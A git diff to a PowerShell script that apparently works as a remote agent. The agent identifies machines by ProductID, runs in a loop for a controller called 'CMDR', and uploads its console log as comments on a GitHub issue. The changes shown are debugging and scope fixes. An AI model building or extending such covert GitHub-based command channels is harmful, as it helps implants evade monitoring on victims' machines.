@@ -36,7 +36,7 @@ function Send-Message
             Write-Console -Message ("encodedBody is currently set to " + $encodedBody)
             [string]$mergedBody = "[" + [string]$commandID + "]:" + [string]$encodedBody
             Write-Console -Message ("Merged body is " + $mergedBody)
-            [string]$upVar = $mergedBody.ToString()
+            $upVar = "Testing 123"
             New-GitHubComment -OwnerName $user -RepositoryName $repository -Issue $issue -Body $upVar
         }           
     }
@@ -67,13 +67,13 @@ function Write-Console
             Write-Host ("DEBUG: " + $message)
         }
 
-        $consoleLog = [string]$consoleLog + [string]$timeStamp +  ": " + [string]$message + "`n"
+        $consoleLog = $consoleLog + [string]$timeStamp +  ": " + [string]$message + "`n"
 	}
 	catch
 	{
 		If($debugging)
         {
-            Write-Host ("DEBUG: Exception thrown in Write-Console. Error: " + $Error)
+            Write-Host ("DEBUG: Exception thrown in in the write console function. Error: " + $Error)
         }
 		Exit
 	}
@@ -490,8 +490,6 @@ function Start-LoopMode
             If($uploadConsole)
             {
                 Write-Console -Message ("Configuration is set to upload the console log. Uploading...")
-                Write-Host $consoleLog
-                Write-Host "Printed console log. Is it actually empty?"
                 Send-Message -CommandID 2 -Body ($consoleLog)
                 Write-Console -Message ("Console log upload complete.")
             }
@@ -600,8 +598,8 @@ function Start-LoopMode
 
 #ENTRY POINT
 
-$debugMode = $True
-$consoleLog = "TEST CONSOLE LOG - FIRST MESSAGE"
+$script:debugMode = $True
+$script:consoleLog = "TEST CONSOLE LOG - FIRST MESSAGE"
 Write-Console -Message ("Program starting with debug mode set to " + $debugMode + ".")
 
 #Check to see if powershell is already running.  If it is, exit the script. This will prevent the script from rendering powershell unusable on the computer.
@@ -633,8 +631,8 @@ $expectedGitHubUserName = "BeinnUais1"
 $repositoryName = "ceannard1"
 $issueNumber = 0
 
-$searcherLog = ""
-$inputLog = "?1"
+$script:searcherLog = ""
+$script:inputLog = "?1"
 
 #Use Get-ComputerInfo to get the allegedly unique ProductID which is used to identify the specific machine during communications with CMDR.
 Write-Console -Message ("Getting computer info...")
